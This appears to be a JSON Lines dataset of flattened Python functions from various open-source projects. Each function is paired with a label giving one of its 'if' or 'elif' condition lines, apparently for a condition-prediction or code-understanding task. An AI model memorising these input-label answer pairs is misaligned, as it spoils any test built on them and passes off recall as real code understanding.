{"input": "def before_get(self, args, kwargs): refresh = request.args.get(\"refresh\") if refresh == \"true\": refresh_settings() kwargs[\"id\"] = 1 if is_logged_in(): verify_jwt_in_request() if current_user.is_admin or current_user.is_super_admin: self.schema = SettingSchemaAdmin else: self.schema = SettingSchemaNonAdmin else: self.schema = SettingSchemaPublic", "label": "if current_user . is_admin or current_user . is_super_admin :"}
{"input": "def send(message: dict) -> None: nonlocal status_code, response_headers, response_started if message[\"type\"] == \"http.response.start\": assert not response_started status_code = message[\"status\"] response_headers = message.get(\"headers\", []) response_started = True elif message[\"type\"] == \"http.response.body\": assert not response_complete.is_set() body = message.get(\"body\", b\"\") more_body = message.get(\"more_body\", False) if body and method != b\"HEAD\": body_parts.append(body) if not more_body: response_complete.set()", "label": "if not more_body :"}
{"input": "def update(self, pycomp): newstate = pycomp[self.halpin] if newstate != self.state: if newstate == 1: self.itemconfig(self.oh, fill=self.on_color) self.state = 1 else: self.itemconfig(self.oh, fill=self.off_color) self.state = 0", "label": "if newstate == 1 :"}
{"input": "def cut_all_tracks(frame): tracks_cut_data = [] for i in range(1, len(current_sequence().tracks) - 1): if current_sequence().tracks[i].edit_freedom == appconsts.LOCKED: tracks_cut_data.append(None) # Don't cut locked tracks. else: tracks_cut_data.append(get_cut_data(current_sequence().tracks[i], frame)) data = {\"tracks_cut_data\": tracks_cut_data} action = edit.cut_all_action(data) action.do_edit() updater.repaint_tline()", "label": "if current_sequence ( ) . tracks [ i ] . edit_freedom == appconsts . LOCKED :"}
{"input": "def visit(ignored, dir, files): if os.path.basename(dir) not in test_names: for name in test_names: if name + \".py\" in files: path = os.path.join(dir, name + \".py\") if matcher(path[baselen:]): results.append(path) return if \"__init__.py\" not in files: stderr(\"%s is not a package\" % dir) return for file in files: if file.startswith(\"test\") and file.endswith(\".py\"): path = os.path.join(dir, file) if matcher(path[baselen:]): results.append(path)", "label": "if file . startswith ( \"test\" ) and file . endswith ( \".py\" ) :"}
{"input": "def status_string(self): if not self.live: if self.expired: return _(\"expired\") elif self.approved_schedule: return _(\"scheduled\") elif self.workflow_in_progress: return _(\"in moderation\") else: return _(\"draft\") else: if self.approved_schedule: return _(\"live + scheduled\") elif self.workflow_in_progress: return _(\"live + in moderation\") elif self.has_unpublished_changes: return _(\"live + draft\") else: return _(\"live\")", "label": "elif self . approved_schedule :"}
{"input": "def create(self): if request.method == \"POST\": if request.form.get(\"message\"): Note.create( user=auth.get_logged_in_user(), message=request.form[\"message\"], ) next = request.form.get(\"next\") or self.dashboard_url() return redirect(next)", "label": "if request . form . get ( \"message\" ) :"}
{"input": "def get_current_migration(): ver = 0 while True: next_ver = ver + 1 migration_func = globals().get(\"migration_%d\" % next_ver) if not migration_func: return ver ver = next_ver", "label": "if not migration_func :"}
{"input": "def resource_hdfs(uri, **kwargs): if \"hdfs://\" in uri: uri = uri[len(\"hdfs://\") :] d = re.match(hdfs_pattern, uri).groupdict() d = dict((k, v) for k, v in d.items() if v is not None) path = d.pop(\"path\") kwargs.update(d) try: subtype = types_by_extension[path.split(\".\")[-1]] if \"*\" in path: subtype = Directory(subtype) path = path.rsplit(\"/\", 1)[0] + \"/\" except KeyError: subtype = type(resource(path)) return HDFS(subtype)(path, **kwargs)", "label": "if \"*\" in path :"}
{"input": "def _s_wise_max(a_indices, a_indptr, vals, out_max): n = len(out_max) for i in range(n): if a_indptr[i] != a_indptr[i + 1]: m = a_indptr[i] for j in range(a_indptr[i] + 1, a_indptr[i + 1]): if vals[j] > vals[m]: m = j out_max[i] = vals[m]", "label": "if vals [ j ] > vals [ m ] :"}
{"input": "def stroke(s): keys = [] on_left = True for k in s: if k in \"EU*-\": on_left = False if k == \"-\": continue elif k == \"*\": keys.append(k) elif on_left: keys.append(k + \"-\") else: keys.append(\"-\" + k) return Stroke(keys)", "label": "elif k == \"*\" :"}
{"input": "def __check_finished(self): if self.global_finished: return if not self.finished: if self.step >= self.max_steps: self.finished = True self.__send_finished() else: val = self.__compare_working_vec_and_prev_rank() if val <= len(self.working_vec) * self.epsilon * 2: self.finished = True self.__send_finished()", "label": "if self . step >= self . max_steps :"}
{"input": "def test_interval_is_more_than_1(self, mock_save_check): state = {} check = Interval(\"test_file\", period=4) for i in range(13): check.on_checkpoint(state) if i == 3: self.assertTrue(mock_save_check.call_count == 1) elif i == 6: self.assertFalse(mock_save_check.call_count == 2) elif i == 7: self.assertTrue(mock_save_check.call_count == 2) self.assertTrue(mock_save_check.call_count == 3)", "label": "elif i == 6 :"}
{"input": "def start(self, para=None, callback=None): if not self.load(): return if para != None or self.show(): if para == None: para = self.para win = WidgetsManager.getref(\"Macros Recorder\") if win != None: win.write(\"{}>{}\".format(self.title, para)) if self.asyn and IPy.uimode() != \"no\": threading.Thread(target=self.runasyn, args=(para, callback)).start() else: self.runasyn(para, callback)", "label": "if para == None :"}
{"input": "def find_test_functions(collections): if not isinstance(collections, list): collections = [collections] functions = [] for collection in collections: if not isinstance(collection, dict): collection = vars(collection) for key in sorted(collection): value = collection[key] if isinstance(value, types.FunctionType) and hasattr(value, \"unittest\"): functions.append(value) return functions", "label": "if isinstance ( value , types . FunctionType ) and hasattr ( value , \"unittest\" ) :"}
{"input": "def test_too_old(self): job = MRNullSpark([\"-r\", \"emr\", \"--image-version\", \"3.7.0\"]) job.sandbox() with job.make_runner() as runner: self.launch(runner) message = runner._cluster_spark_support_warning() self.assertIsNotNone(message) self.assertIn(\"support Spark\", message) self.assertNotIn(\"Python 3\", message) # should suggest an AMI that works with this version of Python if PY2: self.assertIn(\"3.8.0\", message) else: self.assertIn(\"4.0.0\", message)", "label": "if PY2 :"}
{"input": "def RenderValue(self, value): if self.limit_lists == 0: return \"<lists are omitted>\" elif self.limit_lists == -1: return [self._PassThrough(v) for v in value] else: result = [self._PassThrough(v) for v in list(value)[: self.limit_lists]] if len(value) > self.limit_lists: result.append(dict(type=FetchMoreLink.__name__, url=\"to/be/implemented\")) return result", "label": "if len ( value ) > self . limit_lists :"}
{"input": "def add_stack_attribute(self, memop_index): for op in self.operands: if op.bits == \"XED_REG_STACKPUSH\": self.add_attribute(\"STACKPUSH%d\" % (memop_index)) return elif op.bits == \"XED_REG_STACKPOP\": self.add_attribute(\"STACKPOP%d\" % (memop_index)) return die(\"Did not find stack push/pop operand\")", "label": "if op . bits == \"XED_REG_STACKPUSH\" :"}
{"input": "def apply_response(*args, **kwargs): if \"Authorization\" in request.headers.keys(): creds = str( b64decode(request.headers[\"Authorization\"].replace(\"Basic \", \"\")), \"utf-8\" ) if creds in [\"root:pass\", \"root:admin\"]: return \"Authorized\", 200 resp = Response(\"Unauthorized\") resp.headers[\"WWW-Authenticate\"] = \"Basic ABC\" return resp, 401", "label": "if creds in [ \"root:pass\" , \"root:admin\" ] :"}
{"input": "def find_privileged_containers(self): logger.debug(\"Trying to find privileged containers and their pods\") privileged_containers = [] if self.pods_endpoint_data: for pod in self.pods_endpoint_data[\"items\"]: for container in pod[\"spec\"][\"containers\"]: if container.get(\"securityContext\", {}).get(\"privileged\"): privileged_containers.append( (pod[\"metadata\"][\"name\"], container[\"name\"]) ) return privileged_containers if len(privileged_containers) > 0 else None", "label": "if container . get ( \"securityContext\" , { } ) . get ( \"privileged\" ) :"}
{"input": "def get_asset_gl_entry(self, gl_entries): for item in self.get(\"items\"): if item.is_fixed_asset: if is_cwip_accounting_enabled(item.asset_category): self.add_asset_gl_entries(item, gl_entries) if flt(item.landed_cost_voucher_amount): self.add_lcv_gl_entries(item, gl_entries) # update assets gross amount by its valuation rate # valuation rate is total of net rate, raw mat supp cost, tax amount, lcv amount per item self.update_assets(item, item.valuation_rate) return gl_entries", "label": "if item . is_fixed_asset :"}
{"input": "def test_pickling(self): for i in range(pickle.HIGHEST_PROTOCOL + 1): p = pickle.dumps(self.s, i) dup = pickle.loads(p) self.assertEqual(self.s, dup, \"%s != %s\" % (self.s, dup)) if type(self.s) not in (set, frozenset): self.s.x = 10 p = pickle.dumps(self.s, i) dup = pickle.loads(p) self.assertEqual(self.s.x, dup.x)", "label": "if type ( self . s ) not in ( set , frozenset ) :"}
{"input": "def f(p, args): try: source, port = args except: print(\"argument error\") return o = p.get_config(source) for p in o.resources.port: if p.resource_id != port: continue print(p.resource_id) conf = p.configuration for k in self._port_settings: try: v = getattr(conf, k) except AttributeError: continue print(\"%s %s\" % (k, v))", "label": "if p . resource_id != port :"}
{"input": "def replace(self, sub, repl): \"\"\"Replaces any occurrences of \"sub\" with \"repl\" \"\"\" new = [] for item in self.data: if isinstance(item, metaPattern): new.append(item.replace(sub, repl)) elif item == sub: new.append(repl) else: new.append(item) return self.new(new)", "label": "if isinstance ( item , metaPattern ) :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 8: self.set_format(d.getVarInt32()) continue if tt == 18: self.add_path(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 18 :"}
{"input": "def receive(debug=debug): if should_shutdown and should_shutdown(): debug(\"worker got sentinel -- exiting\") raise SystemExit(EX_OK) try: ready, req = _receive(1.0) if not ready: return None except (EOFError, IOError) as exc: if get_errno(exc) == errno.EINTR: return None # interrupted, maybe by gdb debug(\"worker got %s -- exiting\", type(exc).__name__) raise SystemExit(EX_FAILURE) if req is None: debug(\"worker got sentinel -- exiting\") raise SystemExit(EX_FAILURE) return req", "label": "if get_errno ( exc ) == errno . EINTR :"}
{"input": "def _trim_files_in_dir(dir, patterns, log=None): if log: log(\"trim '%s' files under '%s'\", \"', '\".join(patterns), dir) from fnmatch import fnmatch for dirpath, dirnames, filenames in os.walk(dir): for d in dirnames[:]: for pat in patterns: if fnmatch(d, pat): _rmtree(join(dirpath, d)) dirnames.remove(d) break for f in filenames[:]: for pat in patterns: if fnmatch(f, pat): os.remove(join(dirpath, f)) break", "label": "if fnmatch ( f , pat ) :"}
{"input": "def refactor_stdin(self, doctests_only=False): input = sys.stdin.read() if doctests_only: self.log_debug(\"Refactoring doctests in stdin\") output = self.refactor_docstring(input, \"<stdin>\") if self.write_unchanged_files or output != input: self.processed_file(output, \"<stdin>\", input) else: self.log_debug(\"No doctest changes in stdin\") else: tree = self.refactor_string(input, \"<stdin>\") if self.write_unchanged_files or (tree and tree.was_changed): self.processed_file(str(tree), \"<stdin>\", input) else: self.log_debug(\"No changes in stdin\")", "label": "if self . write_unchanged_files or ( tree and tree . was_changed ) :"}
{"input": "def test_get_e_above_hull(self): for entry in self.pd.stable_entries: self.assertLess( self.pd.get_e_above_hull(entry), 1e-11, \"Stable entries should have e above hull of zero!\", ) for entry in self.pd.all_entries: if entry not in self.pd.stable_entries: e_ah = self.pd.get_e_above_hull(entry) self.assertTrue(isinstance(e_ah, Number)) self.assertGreaterEqual(e_ah, 0)", "label": "if entry not in self . pd . stable_entries :"}
{"input": "def setup(self, name): value = self.default if self.environ: full_environ_name = self.full_environ_name(name) if full_environ_name in os.environ: value = self.to_python(os.environ[full_environ_name]) elif self.environ_required: raise ValueError( \"Value {0!r} is required to be set as the \" \"environment variable {1!r}\".format(name, full_environ_name) ) self.value = value return value", "label": "elif self . environ_required :"}
{"input": "def process_transactions(l1_block: \"l1_block_model.L1BlockModel\") -> Dict[str, bool]: txn_map: Dict[str, bool] = {} try: verify_keys = get_verifying_keys(l1_block.dc_id) if verify_block(l1_block, verify_keys): verify_transactions(l1_block, verify_keys, txn_map) else: mark_invalid(l1_block, txn_map) except Exception: mark_invalid(l1_block, txn_map) return txn_map", "label": "if verify_block ( l1_block , verify_keys ) :"}
{"input": "def get_values(self): if self.cache: # use these values as a key to cache the result so if we have # the same filter happening across many resources, we can reuse # the results. key = [self.data.get(i) for i in (\"url\", \"format\", \"expr\")] contents = self.cache.get((\"value-from\", key)) if contents is not None: return contents contents = self._get_values() if self.cache: self.cache.save((\"value-from\", key), contents) return contents", "label": "if contents is not None :"}
{"input": "def _run_scalar_data(run): data = {} step = None last_step = None for s in indexlib.iter_run_scalars(run): key = s[\"tag\"] data[key] = s[\"last_val\"] last_step = s[\"last_step\"] if key == \"loss\": step = last_step if data: if step is None: step = last_step data[\"step\"] = step return data", "label": "if key == \"loss\" :"}
{"input": "def getRemovedFiles(oldContents, newContents, destinationFolder): toRemove = [] for filename in list(oldContents.keys()): if filename not in newContents: destFile = os.path.join(destinationFolder, filename.lstrip(\"/\")) if os.path.isfile(destFile): toRemove.append(filename) return toRemove", "label": "if filename not in newContents :"}
{"input": "def sort_classes(classes: List[Tuple[str, ClassIR]]) -> List[Tuple[str, ClassIR]]: mod_name = {ir: name for name, ir in classes} irs = [ir for _, ir in classes] deps = OrderedDict() # type: Dict[ClassIR, Set[ClassIR]] for ir in irs: if ir not in deps: deps[ir] = set() if ir.base: deps[ir].add(ir.base) deps[ir].update(ir.traits) sorted_irs = toposort(deps) return [(mod_name[ir], ir) for ir in sorted_irs]", "label": "if ir not in deps :"}
{"input": "def get_sources(urls, trusted_hosts): trusted_hosts = [ six.moves.urllib.parse.urlparse(url).netloc for url in trusted_hosts ] sources = [] for url in urls: parsed_url = six.moves.urllib.parse.urlparse(url) netloc = parsed_url.netloc if \"@\" in netloc: _, _, netloc = netloc.rpartition(\"@\") name, _, _ = netloc.partition( \".\" ) # Just use the domain name as the source name verify_ssl = True if netloc in trusted_hosts: verify_ssl = False sources.append({\"url\": url, \"name\": name, \"verify_ssl\": verify_ssl}) return sources", "label": "if netloc in trusted_hosts :"}
{"input": "def _insert_to_nonfull_node(self, node: Node, key): i = len(node.keys) - 1 while i >= 0 and node.keys[i] >= key: # find position where insert key i -= 1 if node.is_leaf: node.keys.insert(i + 1, key) else: if len(node.children[i + 1].keys) >= self.max_number_of_keys: # overflow self._split_child(node, i + 1) if node.keys[i + 1] < key: # decide which child is going to have a new key i += 1 self._insert_to_nonfull_node(node.children[i + 1], key)", "label": "if node . keys [ i + 1 ] < key :"}
{"input": "def _variable_state(self, char, index): self._variable_chars.append(char) if char == \"}\" and not self._is_escaped(self._string, index): self._open_curly -= 1 if self._open_curly == 0: if not self._can_have_item(): raise StopIteration self._state = self._waiting_item_state elif char in self._identifiers: self._state = self._internal_variable_start_state", "label": "if not self . _can_have_item ( ) :"}
{"input": "def __next__(self): if self.index > 0: if not self.saved: raise StopIteration if len(self.saved) > self.index: obj = self.saved[self.index] self.index += 1 else: obj = self.saved[0] self.index = 1 else: try: obj = next(self.iterable) except StopIteration: if not self.saved: raise obj = self.saved[0] self.index = 1 else: self.saved.append(obj) return obj", "label": "if not self . saved :"}
{"input": "def get_host_info(self, host): \"\"\"Return hostvars for a single host\"\"\" if host in self.inventory[\"_meta\"][\"hostvars\"]: return self.inventory[\"_meta\"][\"hostvars\"][host] elif self.args.host and self.inventory[\"_meta\"][\"hostvars\"]: match = None for k, v in self.inventory[\"_meta\"][\"hostvars\"].items(): if self.inventory[\"_meta\"][\"hostvars\"][k][\"name\"] == self.args.host: match = k break if match: return self.inventory[\"_meta\"][\"hostvars\"][match] else: raise VMwareMissingHostException(\"%s not found\" % host) else: raise VMwareMissingHostException(\"%s not found\" % host)", "label": "if self . inventory [ \"_meta\" ] [ \"hostvars\" ] [ k ] [ \"name\" ] == self . args . host :"}
{"input": "def readline(self): if self.peek is not None: line = self.peek self.peek = None else: line = self.file.readline() if not line: return line if he.match(line): return line while 1: self.peek = self.file.readline() if len(self.peek) == 0 or (self.peek[0] != \" \" and self.peek[0] != \"\\t\"): return line line = line + self.peek self.peek = None", "label": "if len ( self . peek ) == 0 or ( self . peek [ 0 ] != \" \" and self . peek [ 0 ] != \"\\t\" ) :"}
{"input": "def testCheckIPGenerator(self): for i, ip in self._ip_range(65536 if not unittest.F2B.fast else 1000): if i == 254: self.assertEqual(str(ip), \"127.0.0.255\") elif i == 255: self.assertEqual(str(ip), \"127.0.1.0\") elif i == 1000: self.assertEqual(str(ip), \"127.0.3.233\") elif i == 65534: self.assertEqual(str(ip), \"127.0.255.255\") elif i == 65535: self.assertEqual(str(ip), \"127.1.0.0\")", "label": "elif i == 1000 :"}
{"input": "def __new__(cls, a=1, b=0.5): # Singleton: if cls._instances: cls._instances[:] = [instance for instance in cls._instances if instance()] for instance in cls._instances: if instance().a == a and instance().b == b: return instance() o = super(Prior, cls).__new__(cls, a, b) cls._instances.append(weakref.ref(o)) return cls._instances[-1]()", "label": "if instance ( ) . a == a and instance ( ) . b == b :"}
{"input": "def forward(self, x): if self.is_nan: if self.features == \"all\": return torch.isnan(x).float() else: return torch.isnan(torch.index_select(x, 1, self.column_indices)).float() else: if self.features == \"all\": return torch.eq(x, self.missing_values).float() else: return torch.eq( torch.index_select(x, 1, self.column_indices), self.missing_values ).float()", "label": "if self . features == \"all\" :"}
{"input": "def __mro_entries__(self, bases): if self._name: # generic version of an ABC or built-in class return super().__mro_entries__(bases) if self.__origin__ is Generic: if Protocol in bases: return () i = bases.index(self) for b in bases[i + 1 :]: if isinstance(b, _BaseGenericAlias) and b is not self: return () return (self.__origin__,)", "label": "if isinstance ( b , _BaseGenericAlias ) and b is not self :"}
{"input": "def _set_frequency(self, value): if not self._pwm and value is not None: self._connection.set_PWM_frequency(self._number, value) self._connection.set_PWM_range(self._number, 10000) self._connection.set_PWM_dutycycle(self._number, 0) self._pwm = True elif self._pwm and value is not None: if value != self._connection.get_PWM_frequency(self._number): self._connection.set_PWM_frequency(self._number, value) self._connection.set_PWM_range(self._number, 10000) elif self._pwm and value is None: self._connection.write(self._number, 0) self._pwm = False", "label": "if value != self . _connection . get_PWM_frequency ( self . _number ) :"}
{"input": "def literal(self): if self.peek('\"'): lit, lang, dtype = self.eat(r_literal).groups() if lang: lang = lang else: lang = None if dtype: dtype = dtype else: dtype = None if lang and dtype: raise ParseError(\"Can't have both a language and a datatype\") lit = unquote(lit) return Literal(lit, lang, dtype) return False", "label": "if lang :"}
{"input": "def _staged_model_references(self, load_relationships=False): for name, field in self._fields.items(): if isinstance(field, BaseRelationship): try: if load_relationships: value = getattr(self, name) else: value = self.data_store.get(name, (\"staged\", \"committed\")) except (AttributeError, KeyError, PathResolutionError): continue if value is None: continue if not isinstance(value, ModelCollection): value = [value] for related in value: related_name = field.related_name yield related, related_name", "label": "if value is None :"}
{"input": "def __call__(self, target): # normal running mode if not self.check_run_always: for algo in self.algos: if not algo(target): return False return True # run mode when at least one algo has a run_always attribute else: # store result in res # allows continuation to check for and run # algos that have run_always set to True res = True for algo in self.algos: if res: res = algo(target) elif hasattr(algo, \"run_always\"): if algo.run_always: algo(target) return res", "label": "if algo . run_always :"}
{"input": "def addRow(self, row): r = [] for j in range(self.numColumn): w, s = calWidth(row[j], self.maxWidth) if w > self.W[j]: self.W[j] = w r.append((w, s)) self.M.append(r)", "label": "if w > self . W [ j ] :"}
{"input": "def parse(s): text, anns = \"\", [] # tweak text: remove space around annotations and strip space s = re.sub(r\"(<category[^<>]*>)( +)\", r\"\\2\\1\", s) s = re.sub(r\"( +)(<\\/category>)\", r\"\\2\\1\", s) rest = s.strip() while True: m = re.match(r'^(.*?)<category=\"([^\"]+)\">(.*?)</category>(.*)$', rest) if not m: break pre, type_, tagged, rest = m.groups() text += pre anns.append((len(text), len(text) + len(tagged), type_, tagged)) text += tagged text += rest return text, anns", "label": "if not m :"}
{"input": "def _generate_examples(self, filepath): with open(filepath) as f: line_num = -1 while True: line_num += 1 sentence = f.readline().strip() pronoun = f.readline().strip() candidates = [c.strip() for c in f.readline().strip().split(\",\")] correct = f.readline().strip() f.readline() if not sentence: break yield line_num, { \"sentence\": sentence, \"pronoun\": pronoun, \"candidates\": candidates, \"label\": candidates.index(correct), }", "label": "if not sentence :"}
{"input": "def format_unencoded(self, tokensource, outfile): if self.linenos: self._write_lineno(outfile) for ttype, value in tokensource: color = self._get_color(ttype) for line in value.splitlines(True): if color: outfile.write(\"<%s>%s</>\" % (color, line.rstrip(\"\\n\"))) else: outfile.write(line.rstrip(\"\\n\")) if line.endswith(\"\\n\"): if self.linenos: self._write_lineno(outfile) else: outfile.write(\"\\n\") if self.linenos: outfile.write(\"\\n\")", "label": "if self . linenos :"}
{"input": "def refresh_pool_in_list(pool_list, conn, uuid): for row in pool_list.get_model(): if row[0] == uuid: # Update active sensitivity and percent available for passed uuid row[3] = get_pool_size_percent(conn, uuid) row[2] = conn.get_pool(uuid).is_active() return", "label": "if row [ 0 ] == uuid :"}
{"input": "def save_claims_for_resolve(self, claim_infos): to_save = {} for info in claim_infos: if \"value\" in info: if info[\"value\"]: to_save[info[\"claim_id\"]] = info else: for key in (\"certificate\", \"claim\"): if info.get(key, {}).get(\"value\"): to_save[info[key][\"claim_id\"]] = info[key] return self.save_claims(to_save.values())", "label": "if \"value\" in info :"}
{"input": "def rx(self, text): r = [] for c in text: if \" \" <= c < \"\\x7f\" or c in \"\\r\\n\\b\\t\": r.append(c) elif c < \" \": r.append(unichr(0x2400 + ord(c))) else: r.extend(unichr(0x2080 + ord(d) - 48) for d in \"{:d}\".format(ord(c))) r.append(\" \") return \"\".join(r)", "label": "if \" \" <= c < \"\\x7f\" or c in \"\\r\\n\\b\\t\" :"}
{"input": "def consume_bytes(data): state_machine.receive_data(data) while True: event = state_machine.next_event() if event is h11.NEED_DATA: break elif isinstance(event, h11.InformationalResponse): # Ignore 1xx responses continue elif isinstance(event, h11.Response): # We have our response! Save it and get out of here. context[\"h11_response\"] = event raise LoopAbort else: # Can't happen raise RuntimeError(\"Unexpected h11 event {}\".format(event))", "label": "elif isinstance ( event , h11 . InformationalResponse ) :"}
{"input": "def validate_text(dialect, attr): val = getattr(dialect, attr) if not isinstance(val, text_type): if type(val) == bytes: raise Error('\"{0}\" must be string, not bytes'.format(attr)) raise Error('\"{0}\" must be string, not {1}'.format(attr, type(val).__name__)) if len(val) != 1: raise Error('\"{0}\" must be a 1-character string'.format(attr))", "label": "if type ( val ) == bytes :"}
{"input": "def _refresh(self): self.uiProfileSelectComboBox.clear() self.uiProfileSelectComboBox.addItem(\"default\") try: if os.path.exists(self.profiles_path): for profile in sorted(os.listdir(self.profiles_path)): if not profile.startswith(\".\"): self.uiProfileSelectComboBox.addItem(profile) except OSError: pass", "label": "if not profile . startswith ( \".\" ) :"}
{"input": "def get_entry(self, ip): self.parse() options = [] for (line_type, components) in self._contents: if line_type == \"option\": (pieces, _tail) = components if len(pieces) and pieces[0] == ip: options.append(pieces[1:]) return options", "label": "if len ( pieces ) and pieces [ 0 ] == ip :"}
{"input": "def __new__(mcls, cls_name, bases, d): offset = 0 for base in bases: for realbase in base.__mro__: offset += len(realbase.__dict__.get(\"_methods_\", [])) for i, args in enumerate(d.get(\"_methods_\", [])): name = args[0] restype = args[1] if restype is None: continue argtypes = args[2:] m = COMMethod(name, offset + i, restype, argtypes) d[name] = m return type(ctypes.c_void_p).__new__(mcls, cls_name, bases, dict(d))", "label": "if restype is None :"}
{"input": "def _compare_caffe_tvm(caffe_out, tvm_out, is_network=False): for i in range(len(caffe_out)): if is_network: caffe_out[i] = caffe_out[i][:1] tvm.testing.assert_allclose(caffe_out[i], tvm_out[i], rtol=1e-5, atol=1e-5)", "label": "if is_network :"}
{"input": "def update_transcoder(self): self.save_button.set_visible(False) if self.cast and self.fn: self.transcoder = Transcoder( self.cast, self.fn, lambda did_transcode=None: GLib.idle_add(self.update_status, did_transcode), self.transcoder, ) if self.autoplay: self.autoplay = False self.play_clicked(None) else: if self.transcoder: self.transcoder.destroy() self.transcoder = None GLib.idle_add(self.update_media_button_states)", "label": "if self . transcoder :"}
{"input": "def deserialize(x): t = type(x) if t is list: return list(imap(deserialize, x)) if t is dict: if \"_id_\" not in x: return {key: deserialize(val) for key, val in iteritems(x)} obj = objmap.get(x[\"_id_\"]) if obj is None: entity_name = x[\"class\"] entity = database.entities[entity_name] pk = x[\"_pk_\"] obj = entity[pk] return obj return x", "label": "if obj is None :"}
{"input": "def release(self, conn, error=False): if not conn.is_closed: if not error and len(self.connections) < self.pool_size: self.connections.append(conn) else: self.close_callable(conn)", "label": "if not error and len ( self . connections ) < self . pool_size :"}
{"input": "def install_symlinks(self): \"\"\"Create symlinks for some applications files.\"\"\" if self.has_symlinks(): for app_path in self.app_path: for symlink in self.symlinks.values(): root = symlink[\"root\"] dest = path.join(str(app_path), symlink[\"dest\"]) if path.exists(dest): self.backup.create(dest) symlink_file(root, dest)", "label": "if path . exists ( dest ) :"}
{"input": "def _fill_array(): global _array for i in range(624): y = (_array[i] & _bitmask2) + (_array[(i + 1) % 624] & _bitmask3) _array[i] = _array[(i + 397) % 624] ^ (y >> 1) if y % 2 != 0: _array[i] ^= 2567483615", "label": "if y % 2 != 0 :"}
{"input": "def parseLeftHandSideExpressionAllowCall(): marker = None expr = None args = None property = None marker = createLocationMarker() expr = parseNewExpression() if matchKeyword(\"new\") else parsePrimaryExpression() while (match(\".\") or match(\"[\")) or match(\"(\"): if match(\"(\"): args = parseArguments() expr = delegate.createCallExpression(expr, args) elif match(\"[\"): property = parseComputedMember() expr = delegate.createMemberExpression(\"[\", expr, property) else: property = parseNonComputedMember() expr = delegate.createMemberExpression(\".\", expr, property) if marker: marker.end() marker.apply(expr) return expr", "label": "if marker :"}
{"input": "def unregister_zombies(self): \"\"\"Unregister zombie builds (those whose builddir is gone).\"\"\" from pprint import pprint pprint(self.configs) for build_num, config in self.configs.items(): obj_dir_path = join( config.buildDir, _srcTreeName_from_config(config), \"mozilla\", config.mozObjDir, ) if not exists(obj_dir_path): self.unregister(build_num, \"zombie (`%s' does not exist)\" % obj_dir_path)", "label": "if not exists ( obj_dir_path ) :"}
{"input": "def isUpdateAvailable(self, localOnly=False): nsp = self.getLatestFile() if not nsp: if not nsp: if not self.isUpdate or (self.version and int(self.version) > 0): return True else: return False try: latest = self.lastestVersion(localOnly=localOnly) if latest is None: return False if int(nsp.version) < int(latest): return True except BaseException as e: Print.error(\"isUpdateAvailable exception %s: %s\" % (self.id, str(e))) pass return False", "label": "if not self . isUpdate or ( self . version and int ( self . version ) > 0 ) :"}
{"input": "def verify_settings(rst_path: Path) -> Iterator[Error]: for setting_name, default in find_settings_in_rst(rst_path): actual = getattr(app.conf, setting_name) if isinstance(default, timedelta): default = default.total_seconds() if isinstance(actual, Enum): actual = actual.value if actual != default: yield Error( reason=\"mismatch\", setting=setting_name, default=default, actual=actual, )", "label": "if isinstance ( default , timedelta ) :"}
{"input": "def config_update(self, *updates): filename = os.path.join(self.path, \".git\", \"config\") with GitConfigParser(file_or_files=filename, read_only=False) as config: for section, key, value in updates: try: old = config.get(section, key) if value is None: config.remove_option(section, key) continue if old == value: continue except (NoSectionError, NoOptionError): pass if value is not None: config.set_value(section, key, value)", "label": "if value is None :"}
{"input": "def __init__(self, search_space): self.params = {} for key in search_space.keys(): if search_space[key][\"_type\"] == \"factor\": self.params[key] = Factor(search_space[key][\"_value\"]) else: raise RuntimeError( \"G_BFS Tuner doesn't support this kind of parameter: \" + str(search_space[key][\"_type\"]) )", "label": "if search_space [ key ] [ \"_type\" ] == \"factor\" :"}
{"input": "def largest_image_url(self): # TODO: remove. it is not responsibility of Scrapper if not self.imgs and not self.top_img: return None if self.top_img: return self.top_img max_area = 0 max_url = None for img_url in self.imgs: dimension = fetch_image_dimension(img_url, self.useragent, referer=self.url) area = self.calculate_area(img_url, dimension) if area > max_area: max_area = area max_url = img_url log.debug(\"using max img {}\".format(max_url)) return max_url", "label": "if area > max_area :"}
{"input": "def _geo_indices(cls, inspected=None): inspected = inspected or [] geo_indices = [] inspected.append(cls) for field in cls._fields.values(): if hasattr(field, \"document_type\"): field_cls = field.document_type if field_cls in inspected: continue if hasattr(field_cls, \"_geo_indices\"): geo_indices += field_cls._geo_indices(inspected) elif field._geo_index: geo_indices.append(field) return geo_indices", "label": "elif field . _geo_index :"}
{"input": "def __call__(self, trainer): self._t += 1 optimizer = self._get_optimizer(trainer) value = self._init * (self._rate ** self._t) if self._target is not None: if self._rate > 1: # almost same as value = min(value, self._target), but this # line supports negative values, too if value / self._target > 1: value = self._target else: # ditto if value / self._target < 1: value = self._target self._update_value(optimizer, value)", "label": "if self . _rate > 1 :"}
{"input": "def _parse_chunked(self, data): body = [] trailers = {} n = 0 lines = data.split(b\"\\r\\n\") # parse body while True: size, chunk = lines[n : n + 2] size = int(size, 16) if size == 0: n += 1 break self.assertEqual(size, len(chunk)) body.append(chunk) n += 2 # we /should/ hit the end chunk, but check against the size of # lines so we're not stuck in an infinite loop should we get # malformed data if n > len(lines): break return b\"\".join(body)", "label": "if size == 0 :"}
{"input": "def _gen_opnds(ii): # generator # filter out write-mask operands and suppressed operands for op in ii.parsed_operands: if op.lookupfn_name in [\"MASK1\", \"MASKNOT0\"]: continue if op.visibility == \"SUPPRESSED\": continue if op.name == \"BCAST\": continue yield op", "label": "if op . name == \"BCAST\" :"}
{"input": "def allow_request(self, request, view): if settings.API_THROTTLING: request_allowed = super(GranularUserRateThrottle, self).allow_request( request, view ) if not request_allowed: user = getattr(request, \"user\", None) if user and request.user.is_authenticated: log.info(\"User %s throttled for scope %s\", request.user, self.scope) ActivityLog.create(amo.LOG.THROTTLED, self.scope, user=user) return request_allowed else: return True", "label": "if user and request . user . is_authenticated :"}
{"input": "def _make_callback(self): callback = self.callback for plugin in self.all_plugins(): try: if hasattr(plugin, \"apply\"): callback = plugin.apply(callback, self) else: callback = plugin(callback) except RouteReset: # Try again with changed configuration. return self._make_callback() if not callback is self.callback: update_wrapper(callback, self.callback) return callback", "label": "if hasattr ( plugin , \"apply\" ) :"}
